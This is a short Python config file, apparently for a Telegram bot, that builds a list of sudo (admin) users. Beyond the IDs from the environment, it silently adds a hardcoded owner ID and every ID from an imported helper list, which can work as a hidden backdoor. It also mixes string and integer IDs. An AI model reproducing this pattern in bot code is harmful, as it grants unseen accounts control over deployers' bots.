from strings.helpers import HELPER
from os import getenv

OWNER_ID = "6257927828"

SUDOS = getenv("SUDO_USERS", None)
SUDO_USERS = []
if SUDOS:
    sudos = str(SUDOS).split(" ")
    for sudo_id in sudos:
        SUDO_USERS.append(int(sudo_id))
SUDO_USERS.append(OWNER_ID)
for x in HELPER:
    SUDO_USERS.append(x)
